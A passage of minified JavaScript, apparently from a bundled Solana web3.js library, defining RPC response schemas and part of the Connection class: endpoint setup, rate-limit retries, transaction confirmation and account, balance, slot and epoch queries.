        byIdentity: so(ao(), $r(oo())),
        range: co({ firstSlot: oo(), lastSlot: oo() }),
      })
    );
  const Pa = fa(ga),
    Oa = fa(ba),
    Ra = fa(wa),
    Ma = fa(va),
    La = fa(Aa),
    Na = fa(ka),
    Da = fa(oo()),
    Ua = ha(
      co({
        total: oo(),
        circulating: oo(),
        nonCirculating: oo(),
        nonCirculatingAccounts: $r(ia),
      })
    ),
    qa = co({
      amount: ao(),
      uiAmount: ro(oo()),
      decimals: oo(),
      uiAmountString: io(ao()),
    }),
    za = ha(
      $r(
        co({
          address: ia,
          amount: ao(),
          uiAmount: ro(oo()),
          decimals: oo(),
          uiAmountString: io(ao()),
        })
      )
    ),
    Ka = ha(
      $r(
        co({
          pubkey: ia,
          account: co({
            executable: to(),
            owner: ia,
            lamports: oo(),
            data: aa,
            rentEpoch: oo(),
          }),
        })
      )
    ),
    Wa = co({ program: ao(), parsed: fo(), space: oo() }),
    Fa = ha(
      $r(
        co({
          pubkey: ia,
          account: co({
            executable: to(),
            owner: ia,
            lamports: oo(),
            data: Wa,
            rentEpoch: oo(),
          }),
        })
      )
    ),
    ja = ha($r(co({ lamports: oo(), address: ia }))),
    Ga = co({
      executable: to(),
      owner: ia,
      lamports: oo(),
      data: aa,
      rentEpoch: oo(),
    }),
    Va = co({ pubkey: ia, account: Ga }),
    Ha = ho(lo([eo(ft), Wa]), lo([sa, Wa]), (t) =>
      Array.isArray(t) ? Xr(t, aa) : t
    ),
    Za = co({
      executable: to(),
      owner: ia,
      lamports: oo(),
      data: Ha,
      rentEpoch: oo(),
    }),
    Xa = co({ pubkey: ia, account: Za }),
    Ja = co({
      state: lo([
        no("active"),
        no("inactive"),
        no("activating"),
        no("deactivating"),
      ]),
      active: oo(),
      inactive: oo(),
    }),
    Ya = fa(
      $r(
        co({
          signature: ao(),
          slot: oo(),
          err: Ia,
          memo: ro(ao()),
          blockTime: io(ro(oo())),
        })
      )
    ),
    Qa = fa(
      $r(
        co({
          signature: ao(),
          slot: oo(),
          err: Ia,
          memo: ro(ao()),
          blockTime: io(ro(oo())),
        })
      )
    ),
    $a = co({ subscription: oo(), result: pa(Ga) }),
    tu = co({ pubkey: ia, account: Ga }),
    eu = co({ subscription: oo(), result: pa(tu) }),
    nu = co({ parent: oo(), slot: oo(), root: oo() }),
    ru = co({ subscription: oo(), result: nu }),
    ou = lo([
      co({
        type: lo([
          no("firstShredReceived"),
          no("completed"),
          no("optimisticConfirmation"),
          no("root"),
        ]),
        slot: oo(),
        timestamp: oo(),
      }),
      co({
        type: no("createdBank"),
        parent: oo(),
        slot: oo(),
        timestamp: oo(),
      }),
      co({
        type: no("frozen"),
        slot: oo(),
        timestamp: oo(),
        stats: co({
          numTransactionEntries: oo(),
          numSuccessfulTransactions: oo(),
          numFailedTransactions: oo(),
          maxTransactionsPerEntry: oo(),
        }),
      }),
      co({ type: no("dead"), slot: oo(), timestamp: oo(), err: ao() }),
    ]),
    iu = co({ subscription: oo(), result: ou }),
    su = co({ subscription: oo(), result: pa(lo([Sa, _a])) }),
    au = co({ subscription: oo(), result: oo() }),
    uu = co({
      pubkey: ao(),
      gossip: ro(ao()),
      tpu: ro(ao()),
      rpc: ro(ao()),
      version: ro(ao()),
    }),
    cu = co({
      votePubkey: ao(),
      nodePubkey: ao(),
      activatedStake: oo(),
      epochVoteAccount: to(),
      epochCredits: $r(uo([oo(), oo(), oo()])),
      commission: oo(),
      lastVote: oo(),
      rootSlot: ro(oo()),
    }),
    lu = fa(co({ current: $r(cu), delinquent: $r(cu) })),
    du = lo([no("processed"), no("confirmed"), no("finalized")]),
    fu = co({
      slot: oo(),
      confirmations: ro(oo()),
      err: Ia,
      confirmationStatus: io(du),
    }),
    hu = ha($r(ro(fu))),
    pu = fa(oo()),
    mu = co({
      accountKey: ia,
      writableIndexes: $r(oo()),
      readonlyIndexes: $r(oo()),
    }),
    gu = co({
      signatures: $r(ao()),
      message: co({
        accountKeys: $r(ao()),
        header: co({
          numRequiredSignatures: oo(),
          numReadonlySignedAccounts: oo(),
          numReadonlyUnsignedAccounts: oo(),
        }),
        instructions: $r(
          co({ accounts: $r(oo()), data: ao(), programIdIndex: oo() })
        ),
        recentBlockhash: ao(),
        addressTableLookups: io($r(mu)),
      }),
    }),
    yu = co({
      pubkey: ia,
      signer: to(),
      writable: to(),
      source: io(lo([no("transaction"), no("lookupTable")])),
    }),
    wu = co({ accountKeys: $r(yu), signatures: $r(ao()) }),
    bu = co({ parsed: fo(), program: ao(), programId: ia }),
    vu = co({ accounts: $r(ia), data: ao(), programId: ia }),
    Au = ho(
      lo([vu, bu]),
      lo([
        co({ parsed: fo(), program: ao(), programId: ao() }),
        co({ accounts: $r(ao()), data: ao(), programId: ao() }),
      ]),
      (t) => Xr(t, "accounts" in t ? vu : bu)
    ),
    ku = co({
      signatures: $r(ao()),
      message: co({
        accountKeys: $r(yu),
        instructions: $r(Au),
        recentBlockhash: ao(),
        addressTableLookups: io(ro($r(mu))),
      }),
    }),
    Iu = co({
      accountIndex: oo(),
      mint: ao(),
      owner: io(ao()),
      programId: io(ao()),
      uiTokenAmount: qa,
    }),
    Su = co({ writable: $r(ia), readonly: $r(ia) }),
    _u = co({
      err: Ia,
      fee: oo(),
      innerInstructions: io(
        ro(
          $r(
            co({
              index: oo(),
              instructions: $r(
                co({ accounts: $r(oo()), data: ao(), programIdIndex: oo() })
              ),
            })
          )
        )
      ),
      preBalances: $r(oo()),
      postBalances: $r(oo()),
      logMessages: io(ro($r(ao()))),
      preTokenBalances: io(ro($r(Iu))),
      postTokenBalances: io(ro($r(Iu))),
      loadedAddresses: io(Su),
      computeUnitsConsumed: io(oo()),
    }),
    Tu = co({
      err: Ia,
      fee: oo(),
      innerInstructions: io(ro($r(co({ index: oo(), instructions: $r(Au) })))),
      preBalances: $r(oo()),
      postBalances: $r(oo()),
      logMessages: io(ro($r(ao()))),
      preTokenBalances: io(ro($r(Iu))),
      postTokenBalances: io(ro($r(Iu))),
      loadedAddresses: io(Su),
      computeUnitsConsumed: io(oo()),
    }),
    Bu = lo([no(0), no("legacy")]),
    Cu = co({
      pubkey: ao(),
      lamports: oo(),
      postBalance: ro(oo()),
      rewardType: ro(ao()),
      commission: io(ro(oo())),
    }),
    Eu = fa(
      ro(
        co({
          blockhash: ao(),
          previousBlockhash: ao(),
          parentSlot: oo(),
          transactions: $r(
            co({ transaction: gu, meta: ro(_u), version: io(Bu) })
          ),
          rewards: io($r(Cu)),
          blockTime: ro(oo()),
          blockHeight: ro(oo()),
        })
      )
    ),
    xu = fa(
      ro(
        co({
          blockhash: ao(),
          previousBlockhash: ao(),
          parentSlot: oo(),
          rewards: io($r(Cu)),
          blockTime: ro(oo()),
          blockHeight: ro(oo()),
        })
      )
    ),
    Pu = fa(
      ro(
        co({
          blockhash: ao(),
          previousBlockhash: ao(),
          parentSlot: oo(),
          transactions: $r(
            co({ transaction: wu, meta: ro(_u), version: io(Bu) })
          ),
          rewards: io($r(Cu)),
          blockTime: ro(oo()),
          blockHeight: ro(oo()),
        })
      )
    ),
    Ou = fa(
      ro(
        co({
          blockhash: ao(),
          previousBlockhash: ao(),
          parentSlot: oo(),
          transactions: $r(
            co({ transaction: ku, meta: ro(Tu), version: io(Bu) })
          ),
          rewards: io($r(Cu)),
          blockTime: ro(oo()),
          blockHeight: ro(oo()),
        })
      )
    ),
    Ru = fa(
      ro(
        co({
          blockhash: ao(),
          previousBlockhash: ao(),
          parentSlot: oo(),
          transactions: $r(
            co({ transaction: wu, meta: ro(Tu), version: io(Bu) })
          ),
          rewards: io($r(Cu)),
          blockTime: ro(oo()),
          blockHeight: ro(oo()),
        })
      )
    ),
    Mu = fa(
      ro(
        co({
          blockhash: ao(),
          previousBlockhash: ao(),
          parentSlot: oo(),
          rewards: io($r(Cu)),
          blockTime: ro(oo()),
          blockHeight: ro(oo()),
        })
      )
    ),
    Lu = fa(
      ro(
        co({
          blockhash: ao(),
          previousBlockhash: ao(),
          parentSlot: oo(),
          transactions: $r(co({ transaction: gu, meta: ro(_u) })),
          rewards: io($r(Cu)),
          blockTime: ro(oo()),
        })
      )
    ),
    Nu = fa(
      ro(
        co({
          blockhash: ao(),
          previousBlockhash: ao(),
          parentSlot: oo(),
          signatures: $r(ao()),
          blockTime: ro(oo()),
        })
      )
    ),
    Du = fa(
      ro(
        co({
          slot: oo(),
          meta: ro(_u),
          blockTime: io(ro(oo())),
          transaction: gu,
          version: io(Bu),
        })
      )
    ),
    Uu = fa(
      ro(
        co({
          slot: oo(),
          transaction: ku,
          meta: ro(Tu),
          blockTime: io(ro(oo())),
          version: io(Bu),
        })
      )
    ),
    qu = ha(co({ blockhash: ao(), lastValidBlockHeight: oo() })),
    zu = ha(to()),
    Ku = fa(
      $r(
        co({
          slot: oo(),
          numTransactions: oo(),
          numSlots: oo(),
          samplePeriodSecs: oo(),
        })
      )
    ),
    Wu = ha(ro(co({ feeCalculator: co({ lamportsPerSignature: oo() }) }))),
    Fu = fa(ao()),
    ju = fa(ao()),
    Gu = co({ err: Ia, logs: $r(ao()), signature: ao() }),
    Vu = co({ result: pa(Gu), subscription: oo() }),
    Hu = { "solana-client": "js/1.0.0-maintenance" };
  class Zu {
    constructor(t, e) {
      let n, r, o, i, s, a;
      var u;
      (this._commitment = void 0),
        (this._confirmTransactionInitialTimeout = void 0),
        (this._rpcEndpoint = void 0),
        (this._rpcWsEndpoint = void 0),
        (this._rpcClient = void 0),
        (this._rpcRequest = void 0),
        (this._rpcBatchRequest = void 0),
        (this._rpcWebSocket = void 0),
        (this._rpcWebSocketConnected = !1),
        (this._rpcWebSocketHeartbeat = null),
        (this._rpcWebSocketIdleTimeout = null),
        (this._rpcWebSocketGeneration = 0),
        (this._disableBlockhashCaching = !1),
        (this._pollingBlockhash = !1),
        (this._blockhashInfo = {
          latestBlockhash: null,
          lastFetch: 0,
          transactionSignatures: [],
          simulatedSignatures: [],
        }),
        (this._nextClientSubscriptionId = 0),
        (this._subscriptionDisposeFunctionsByClientSubscriptionId = {}),
        (this._subscriptionHashByClientSubscriptionId = {}),
        (this._subscriptionStateChangeCallbacksByHash = {}),
        (this._subscriptionCallbacksByServerSubscriptionId = {}),
        (this._subscriptionsByHash = {}),
        (this._subscriptionsAutoDisposedByRpc = new Set()),
        (this.getBlockHeight = (() => {
          const t = {};
          return async (e) => {
            const { commitment: n, config: r } = ua(e),
              o = this._buildArgs([], n, void 0, r),
              i = Ys(o);
            return (
              (t[i] =
                t[i] ??
                (async () => {
                  try {
                    const t = Xr(
                      await this._rpcRequest("getBlockHeight", o),
                      fa(oo())
                    );
                    if ("error" in t)
                      throw new Ms(
                        t.error,
                        "failed to get block height information"
                      );
                    return t.result;
                  } finally {
                    delete t[i];
                  }
                })()),
              await t[i]
            );
          };
        })()),
        e && "string" == typeof e
          ? (this._commitment = e)
          : e &&
            ((this._commitment = e.commitment),
            (this._confirmTransactionInitialTimeout =
              e.confirmTransactionInitialTimeout),
            (n = e.wsEndpoint),
            (r = e.httpHeaders),
            (o = e.fetch),
            (i = e.fetchMiddleware),
            (s = e.disableRetryOnRateLimit),
            (a = e.httpAgent)),
        (this._rpcEndpoint = (function (t) {
          if (!1 === /^https?:/.test(t))
            throw new TypeError(
              "Endpoint URL must start with `http:` or `https:`."
            );
          return t;
        })(t)),
        (this._rpcWsEndpoint =
          n ||
          (function (t) {
            const e = t.match(oa);
            if (null == e)
              throw TypeError(`Failed to validate endpoint URL \`${t}\``);
            const [n, r, o, i] = e,
              s = t.startsWith("https:") ? "wss:" : "ws:",
              a = null == o ? null : parseInt(o.slice(1), 10);
            return `${s}//${r}${null == a ? "" : `:${a + 1}`}${i}`;
          })(t)),
        (this._rpcClient = (function (t, e, n, r, o, i) {
          const s = n || ta;
          let a;
          return (
            null != i,
            0,
            r &&
              (a = async (t, e) => {
                const n = await new Promise((n, o) => {
                  try {
                    r(t, e, (t, e) => n([t, e]));
                  } catch (i) {
                    o(i);
                  }
                });
                return await s(...n);
              }),
            new Vo(async (n, r) => {
              const i = {
                method: "POST",
                body: n,
                agent: void 0,
                headers: Object.assign(
                  { "Content-Type": "application/json" },
                  e || {},
                  Hu
                ),
              };
              try {
                let e,
                  n = 5,
                  u = 500;
                for (
                  ;
                  (e = a ? await a(t, i) : await s(t, i)),
                    429 === e.status && !0 !== o && ((n -= 1), 0 !== n);

                )
                  void 0, await Ns(u), (u *= 2);
                const c = await e.text();
                e.ok
                  ? r(null, c)
                  : r(new Error(`${e.status} ${e.statusText}: ${c}`));
              } catch (u) {
                u instanceof Error && r(u);
              }
            }, {})
          );
        })(t, r, o, i, s, a)),
        (this._rpcRequest =
          ((u = this._rpcClient),
          (t, e) =>
            new Promise((n, r) => {
              u.request(t, e, (t, e) => {
                if (t) return r(t), void 0;
                n(e);
              });
            }))),
        (this._rpcBatchRequest = (function (t) {
          return (e) =>
            new Promise((n, r) => {
              0 === e.length && n([]);
              const o = e.map((e) => t.request(e.methodName, e.args));
              t.request(o, (t, e) => {
                if (t) return r(t), void 0;
                n(e);
              });
            });
        })(this._rpcClient)),
        (this._rpcWebSocket = new ea(this._rpcWsEndpoint, {
          autoconnect: !1,
          max_reconnects: 1 / 0,
        })),
        this._rpcWebSocket.on("open", this._wsOnOpen.bind(this)),
        this._rpcWebSocket.on("error", this._wsOnError.bind(this)),
        this._rpcWebSocket.on("close", this._wsOnClose.bind(this)),
        this._rpcWebSocket.on(
          "accountNotification",
          this._wsOnAccountNotification.bind(this)
        ),
        this._rpcWebSocket.on(
          "programNotification",
          this._wsOnProgramAccountNotification.bind(this)
        ),
        this._rpcWebSocket.on(
          "slotNotification",
          this._wsOnSlotNotification.bind(this)
        ),
        this._rpcWebSocket.on(
          "slotsUpdatesNotification",
          this._wsOnSlotUpdatesNotification.bind(this)
        ),
        this._rpcWebSocket.on(
          "signatureNotification",
          this._wsOnSignatureNotification.bind(this)
        ),
        this._rpcWebSocket.on(
          "rootNotification",
          this._wsOnRootNotification.bind(this)
        ),
        this._rpcWebSocket.on(
          "logsNotification",
          this._wsOnLogsNotification.bind(this)
        );
    }
    get commitment() {
      return this._commitment;
    }
    get rpcEndpoint() {
      return this._rpcEndpoint;
    }
    async getBalanceAndContext(t, e) {
      const { commitment: n, config: r } = ua(e),
        o = this._buildArgs([t.toBase58()], n, void 0, r),
        i = Xr(await this._rpcRequest("getBalance", o), ha(oo()));
      if ("error" in i)
        throw new Ms(i.error, `failed to get balance for ${t.toBase58()}`);
      return i.result;
    }
    async getBalance(t, e) {
      return await this.getBalanceAndContext(t, e)
        .then((t) => t.value)
        .catch((e) => {
          throw new Error(
            "failed to get balance of account " + t.toBase58() + ": " + e
          );
        });
    }
    async getBlockTime(t) {
      const e = Xr(await this._rpcRequest("getBlockTime", [t]), fa(ro(oo())));
      if ("error" in e)
        throw new Ms(e.error, `failed to get block time for slot ${t}`);
      return e.result;
    }
    async getMinimumLedgerSlot() {
      const t = Xr(await this._rpcRequest("minimumLedgerSlot", []), fa(oo()));
      if ("error" in t)
        throw new Ms(t.error, "failed to get minimum ledger slot");
      return t.result;
    }
    async getFirstAvailableBlock() {
      const t = Xr(await this._rpcRequest("getFirstAvailableBlock", []), Da);
      if ("error" in t)
        throw new Ms(t.error, "failed to get first available block");
      return t.result;
    }
    async getSupply(t) {
      let e = {};
      e =
        "string" == typeof t
          ? { commitment: t }
          : t
          ? { ...t, commitment: (t && t.commitment) || this.commitment }
          : { commitment: this.commitment };
      const n = Xr(await this._rpcRequest("getSupply", [e]), Ua);
      if ("error" in n) throw new Ms(n.error, "failed to get supply");
      return n.result;
    }
    async getTokenSupply(t, e) {
      const n = this._buildArgs([t.toBase58()], e),
        r = Xr(await this._rpcRequest("getTokenSupply", n), ha(qa));
      if ("error" in r) throw new Ms(r.error, "failed to get token supply");
      return r.result;
    }
    async getTokenAccountBalance(t, e) {
      const n = this._buildArgs([t.toBase58()], e),
        r = Xr(await this._rpcRequest("getTokenAccountBalance", n), ha(qa));
      if ("error" in r)
        throw new Ms(r.error, "failed to get token account balance");
      return r.result;
    }
    async getTokenAccountsByOwner(t, e, n) {
      const { commitment: r, config: o } = ua(n);
      let i = [t.toBase58()];
      "mint" in e
        ? i.push({ mint: e.mint.toBase58() })
        : i.push({ programId: e.programId.toBase58() });
      const s = this._buildArgs(i, r, "base64", o),
        a = Xr(await this._rpcRequest("getTokenAccountsByOwner", s), Ka);
      if ("error" in a)
        throw new Ms(
          a.error,
          `failed to get token accounts owned by account ${t.toBase58()}`
        );
      return a.result;
    }
    async getParsedTokenAccountsByOwner(t, e, n) {
      let r = [t.toBase58()];
      "mint" in e
        ? r.push({ mint: e.mint.toBase58() })
        : r.push({ programId: e.programId.toBase58() });
      const o = this._buildArgs(r, n, "jsonParsed"),
        i = Xr(await this._rpcRequest("getTokenAccountsByOwner", o), Fa);
      if ("error" in i)
        throw new Ms(
          i.error,
          `failed to get token accounts owned by account ${t.toBase58()}`
        );
      return i.result;
    }
    async getLargestAccounts(t) {
      const e = { ...t, commitment: (t && t.commitment) || this.commitment },
        n = e.filter || e.commitment ? [e] : [],
        r = Xr(await this._rpcRequest("getLargestAccounts", n), ja);
      if ("error" in r) throw new Ms(r.error, "failed to get largest accounts");
      return r.result;
    }
    async getTokenLargestAccounts(t, e) {
      const n = this._buildArgs([t.toBase58()], e),
        r = Xr(await this._rpcRequest("getTokenLargestAccounts", n), za);
      if ("error" in r)
        throw new Ms(r.error, "failed to get token largest accounts");
      return r.result;
    }
    async getAccountInfoAndContext(t, e) {
      const { commitment: n, config: r } = ua(e),
        o = this._buildArgs([t.toBase58()], n, "base64", r),
        i = Xr(await this._rpcRequest("getAccountInfo", o), ha(ro(Ga)));
      if ("error" in i)
        throw new Ms(
          i.error,
          `failed to get info about account ${t.toBase58()}`
        );
      return i.result;
    }
    async getParsedAccountInfo(t, e) {
      const { commitment: n, config: r } = ua(e),
        o = this._buildArgs([t.toBase58()], n, "jsonParsed", r),
        i = Xr(await this._rpcRequest("getAccountInfo", o), ha(ro(Za)));
      if ("error" in i)
        throw new Ms(
          i.error,
          `failed to get info about account ${t.toBase58()}`
        );
      return i.result;
    }
    async getAccountInfo(t, e) {
      try {
        return (await this.getAccountInfoAndContext(t, e)).value;
      } catch (n) {
        throw new Error(
          "failed to get info about account " + t.toBase58() + ": " + n
        );
      }
    }
    async getMultipleParsedAccounts(t, e) {
      const { commitment: n, config: r } = ua(e),
        o = t.map((t) => t.toBase58()),
        i = this._buildArgs([o], n, "jsonParsed", r),
        s = Xr(
          await this._rpcRequest("getMultipleAccounts", i),
          ha($r(ro(Za)))
        );
      if ("error" in s)
        throw new Ms(s.error, `failed to get info for accounts ${o}`);
      return s.result;
    }
    async getMultipleAccountsInfoAndContext(t, e) {
      const { commitment: n, config: r } = ua(e),
        o = t.map((t) => t.toBase58()),
        i = this._buildArgs([o], n, "base64", r),
        s = Xr(
          await this._rpcRequest("getMultipleAccounts", i),
          ha($r(ro(Ga)))
        );
      if ("error" in s)
        throw new Ms(s.error, `failed to get info for accounts ${o}`);
      return s.result;
    }
    async getMultipleAccountsInfo(t, e) {
      return (await this.getMultipleAccountsInfoAndContext(t, e)).value;
    }
    async getStakeActivation(t, e, n) {
      const { commitment: r, config: o } = ua(e),
        i = this._buildArgs([t.toBase58()], r, void 0, {
          ...o,
          epoch: null != n ? n : null == o ? void 0 : o.epoch,
        }),
        s = Xr(await this._rpcRequest("getStakeActivation", i), fa(Ja));
      if ("error" in s)
        throw new Ms(s.error, `failed to get Stake Activation ${t.toBase58()}`);
      return s.result;
    }
    async getProgramAccounts(t, e) {
      const { commitment: n, config: r } = ua(e),
        { encoding: o, ...i } = r || {},
        s = this._buildArgs([t.toBase58()], n, o || "base64", {
          ...i,
          ...(i.filters ? { filters: ca(i.filters) } : null),
        }),
        a = await this._rpcRequest("getProgramAccounts", s),
        u = $r(Va),
        c = !0 === i.withContext ? Xr(a, ha(u)) : Xr(a, fa(u));
      if ("error" in c)
        throw new Ms(
          c.error,
          `failed to get accounts owned by program ${t.toBase58()}`
        );
      return c.result;
    }
    async getParsedProgramAccounts(t, e) {
      const { commitment: n, config: r } = ua(e),
        o = this._buildArgs([t.toBase58()], n, "jsonParsed", r),
        i = Xr(await this._rpcRequest("getProgramAccounts", o), fa($r(Xa)));
      if ("error" in i)
        throw new Ms(
          i.error,
          `failed to get accounts owned by program ${t.toBase58()}`
        );
      return i.result;
    }
    async confirmTransaction(t, e) {
      var n;
      let r, o;
      if ("string" == typeof t) r = t;
      else {
        const e = t;
        if (null == (n = e.abortSignal) ? void 0 : n.aborted)
          return Promise.reject(e.abortSignal.reason);
        r = e.signature;
      }
      try {
        o = sr.decode(r);
      } catch (i) {
        throw new Error("signature must be base58 encoded: " + r);
      }
      return (
        ls(64 === o.length, "signature has invalid length"),
        "string" == typeof t
          ? await this.confirmTransactionUsingLegacyTimeoutStrategy({
              commitment: e || this.commitment,
              signature: r,
            })
          : "lastValidBlockHeight" in t
          ? await this.confirmTransactionUsingBlockHeightExceedanceStrategy({
              commitment: e || this.commitment,
              strategy: t,
            })
          : await this.confirmTransactionUsingDurableNonceStrategy({
              commitment: e || this.commitment,
              strategy: t,
            })
      );
    }
    getCancellationPromise(t) {
      return new Promise((e, n) => {
        null != t &&
          (t.aborted
            ? n(t.reason)
            : t.addEventListener("abort", () => {
                n(t.reason);
              }));
      });
    }
    getTransactionConfirmationPromise({ commitment: t, signature: e }) {
      let n,
        r,
        o = !1;
      return {
        abortConfirmation: () => {
          r && (r(), (r = void 0)),
            null != n && (this.removeSignatureListener(n), (n = void 0));
        },
        confirmationPromise: new Promise((i, s) => {
          try {
            n = this.onSignature(
              e,
              (t, e) => {
                n = void 0;
                const r = { context: e, value: t };
                i({ __type: ws.PROCESSED, response: r });
              },
              t
            );
            const a = new Promise((t) => {
              null == n
                ? t()
                : (r = this._onSubscriptionStateChange(n, (e) => {
                    "subscribed" === e && t();
                  }));
            });
            (async () => {
              if ((await a, o)) return;
              const n = await this.getSignatureStatus(e);
              if (o) return;
              if (null == n) return;
              const { context: r, value: u } = n;
              if (null != u)
                if (null == u ? void 0 : u.err) s(u.err);
                else {
                  switch (t) {
                    case "confirmed":
                    case "single":
                    case "singleGossip":
                      if ("processed" === u.confirmationStatus) return;
                      break;
                    case "finalized":
                    case "max":
                    case "root":
                      if (
                        "processed" === u.confirmationStatus ||
                        "confirmed" === u.confirmationStatus
                      )
                        return;
                  }
                  (o = !0),
                    i({
                      __type: ws.PROCESSED,
                      response: { context: r, value: u },
                    });
                }
            })();
          } catch (a) {
            s(a);
          }
        }),
      };
    }
    async confirmTransactionUsingBlockHeightExceedanceStrategy({
      commitment: t,
      strategy: { abortSignal: e, lastValidBlockHeight: n, signature: r },
    }) {
      let o = !1;
      const i = new Promise((e) => {
          const r = async () => {
            try {
              return await this.getBlockHeight(t);
            } catch (e) {
              return -1;
            }
          };
          (async () => {
            let t = await r();
            if (!o) {
              for (; t <= n; ) {
                if ((await Ns(1e3), o)) return;
                if (((t = await r()), o)) return;
              }
              e({ __type: ws.BLOCKHEIGHT_EXCEEDED });
            }
          })();
        }),
        { abortConfirmation: s, confirmationPromise: a } =
          this.getTransactionConfirmationPromise({
            commitment: t,
            signature: r,
          }),
        u = this.getCancellationPromise(e);
      let c;
      try {
        const t = await Promise.race([u, a, i]);
        if (t.__type !== ws.PROCESSED) throw new ts(r);
        c = t.response;
      } finally {
        (o = !0), s();
      }
      return c;
    }
    async confirmTransactionUsingDurableNonceStrategy({
      commitment: t,
      strategy: {
        abortSignal: e,
        minContextSlot: n,
        nonceAccountPubkey: r,
        nonceValue: o,
        signature: i,
      },
    }) {
      let s = !1;
      const a = new Promise((e) => {
          let i = o,
            a = null;
          const u = async () => {
            try {
              const { context: e, value: o } = await this.getNonceAndContext(
                r,
                { commitment: t, minContextSlot: n }
              );
              return (a = e.slot), null == o ? void 0 : o.nonce;
            } catch (e) {
              return i;
            }
          };
          (async () => {
            if (((i = await u()), !s))
              for (;;) {
                if (o !== i)
                  return (
                    e({
                      __type: ws.NONCE_INVALID,
                      slotInWhichNonceDidAdvance: a,
                    }),
                    void 0
                  );
                if ((await Ns(2e3), s)) return;
                if (((i = await u()), s)) return;
              }
          })();
        }),
        { abortConfirmation: u, confirmationPromise: c } =
          this.getTransactionConfirmationPromise({
            commitment: t,
            signature: i,
          }),
        l = this.getCancellationPromise(e);
      let d;
      try {
        const e = await Promise.race([l, c, a]);
        if (e.__type === ws.PROCESSED) d = e.response;
        else {
          let r;
          for (;;) {
            const t = await this.getSignatureStatus(i);
            if (null == t) break;
            if (!(t.context.slot < (e.slotInWhichNonceDidAdvance ?? n))) {
              r = t;
              break;
            }
            await Ns(400);
          }
          if (!(null == r ? void 0 : r.value)) throw new ns(i);
          {
            const e = t || "finalized",
              { confirmationStatus: n } = r.value;
            switch (e) {
              case "processed":
              case "recent":
                if ("processed" !== n && "confirmed" !== n && "finalized" !== n)
                  throw new ns(i);
                break;
              case "confirmed":
              case "single":
              case "singleGossip":
                if ("confirmed" !== n && "finalized" !== n) throw new ns(i);
                break;
              case "finalized":
              case "max":
              case "root":
                if ("finalized" !== n) throw new ns(i);
            }
            d = { context: r.context, value: { err: r.value.err } };
          }
        }
      } finally {
        (s = !0), u();
      }
      return d;
    }
    async confirmTransactionUsingLegacyTimeoutStrategy({
      commitment: t,
      signature: e,
    }) {
      let n;
      const r = new Promise((e) => {
          let r = this._confirmTransactionInitialTimeout || 6e4;
          switch (t) {
            case "processed":
            case "recent":
            case "single":
            case "confirmed":
            case "singleGossip":
              r = this._confirmTransactionInitialTimeout || 3e4;
          }
          n = setTimeout(() => e({ __type: ws.TIMED_OUT, timeoutMs: r }), r);
        }),
        { abortConfirmation: o, confirmationPromise: i } =
          this.getTransactionConfirmationPromise({
            commitment: t,
            signature: e,
          });
      let s;
      try {
        const t = await Promise.race([i, r]);
        if (t.__type !== ws.PROCESSED) throw new es(e, t.timeoutMs / 1e3);
        s = t.response;
      } finally {
        clearTimeout(n), o();
      }
      return s;
    }
    async getClusterNodes() {
      const t = Xr(await this._rpcRequest("getClusterNodes", []), fa($r(uu)));
      if ("error" in t) throw new Ms(t.error, "failed to get cluster nodes");
      return t.result;
    }
    async getVoteAccounts(t) {
      const e = this._buildArgs([], t),
        n = Xr(await this._rpcRequest("getVoteAccounts", e), lu);
      if ("error" in n) throw new Ms(n.error, "failed to get vote accounts");
      return n.result;
    }
    async getSlot(t) {
      const { commitment: e, config: n } = ua(t),
        r = this._buildArgs([], e, void 0, n),
        o = Xr(await this._rpcRequest("getSlot", r), fa(oo()));
      if ("error" in o) throw new Ms(o.error, "failed to get slot");
      return o.result;
    }
    async getSlotLeader(t) {
      const { commitment: e, config: n } = ua(t),
        r = this._buildArgs([], e, void 0, n),
        o = Xr(await this._rpcRequest("getSlotLeader", r), fa(ao()));
      if ("error" in o) throw new Ms(o.error, "failed to get slot leader");
      return o.result;
    }
    async getSlotLeaders(t, e) {
      const n = [t, e],
        r = Xr(await this._rpcRequest("getSlotLeaders", n), fa($r(ia)));
      if ("error" in r) throw new Ms(r.error, "failed to get slot leaders");
      return r.result;
    }
    async getSignatureStatus(t, e) {
      const { context: n, value: r } = await this.getSignatureStatuses([t], e);
      ls(1 === r.length);
      return { context: n, value: r[0] };
    }
    async getSignatureStatuses(t, e) {
      const n = [t];
      e && n.push(e);
      const r = Xr(await this._rpcRequest("getSignatureStatuses", n), hu);
      if ("error" in r) throw new Ms(r.error, "failed to get signature status");
      return r.result;
    }
    async getTransactionCount(t) {
      const { commitment: e, config: n } = ua(t),
        r = this._buildArgs([], e, void 0, n),
        o = Xr(await this._rpcRequest("getTransactionCount", r), fa(oo()));
      if ("error" in o)
        throw new Ms(o.error, "failed to get transaction count");
      return o.result;
    }
    async getTotalSupply(t) {
      return (
        await this.getSupply({
          commitment: t,
          excludeNonCirculatingAccountsList: !0,
        })
      ).value.total;
    }
    async getInflationGovernor(t) {
      const e = this._buildArgs([], t),
        n = Xr(await this._rpcRequest("getInflationGovernor", e), Pa);
      if ("error" in n) throw new Ms(n.error, "failed to get inflation");
      return n.result;
    }
    async getInflationReward(t, e, n) {
      const { commitment: r, config: o } = ua(n),
        i = this._buildArgs([t.map((t) => t.toBase58())], r, void 0, {
          ...o,
          epoch: null != e ? e : null == o ? void 0 : o.epoch,
        }),
        s = Xr(await this._rpcRequest("getInflationReward", i), ya);
      if ("error" in s) throw new Ms(s.error, "failed to get inflation reward");
      return s.result;
    }
    async getInflationRate() {
      const t = Xr(await this._rpcRequest("getInflationRate", []), Oa);
      if ("error" in t) throw new Ms(t.error, "failed to get inflation rate");
      return t.result;
    }
    async getEpochInfo(t) {
      const { commitment: e, config: n } = ua(t),
        r = this._buildArgs([], e, void 0, n),
        o = Xr(await this._rpcRequest("getEpochInfo", r), Ma);
      if ("error" in o) throw new Ms(o.error, "failed to get epoch info");
      return o.result;
    }
    async getEpochSchedule() {
      const t = Xr(await this._rpcRequest("getEpochSchedule", []), La);
      if ("error" in t) throw new Ms(t.error, "failed to get epoch schedule");
      const e = t.result;
      return new $s(
        e.slotsPerEpoch,
        e.leaderScheduleSlotOffset,
        e.warmup,
        e.firstNormalEpoch,
        e.firstNormalSlot
      );
    }
    async getLeaderSchedule() {
      const t = Xr(await this._rpcRequest("getLeaderSchedule", []), Na);
      if ("error" in t) throw new Ms(t.error, "failed to get leader schedule");
      return t.result;
    }
    async getMinimumBalanceForRentExemption(t, e) {
      const n = this._buildArgs([t], e),
        r = Xr(
          await this._rpcRequest("getMinimumBalanceForRentExemption", n),
          pu
        );
      return "error" in r ? (void 0, 0) : r.result;
    }
    async getRecentBlockhashAndContext(t) {
      const {
        context: e,
